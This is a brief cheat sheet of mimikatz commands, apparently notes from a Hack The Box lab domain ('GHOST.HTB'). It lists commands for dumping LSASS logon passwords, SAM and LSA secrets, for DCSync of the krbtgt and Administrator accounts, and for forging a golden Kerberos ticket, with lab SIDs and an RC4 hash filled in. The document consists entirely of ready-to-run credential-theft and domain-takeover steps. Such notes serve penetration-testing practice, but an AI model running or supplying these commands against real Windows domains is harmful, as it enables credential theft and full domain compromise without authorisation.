https://github.com/gentilkiwi/mimikatz

```mimikatz
mimikatz.exe

privilege::debug
token::elevate

# hashes and plaintext passwords
sekurlsa::logonpasswords 
lsadump::sam
lsadump::sam SystemBkup.hiv SamBkup.hiv
lsadump::dcsync /user:krbtgt
lsadump::lsa /patch

lsadump::dcsync /domain:CORP.GHOST.HTB /sid:S-1-5-21-2034262909-2733679486-179904498 /user:Administrator

# Golden Ticket
kerberos::golden /ticket:aaa.kirbi /domain:CORP.GHOST.HTB /sid:S-1-5-21-2034262909-2733679486-179904498 /sids:S-1-5-21-4084500788-938703357-3654145966-519 /rc4:dae1ad83e2af14a379017f244a2f5297 /user:administrator /service:krbtgt /target:GHOST.HTB
```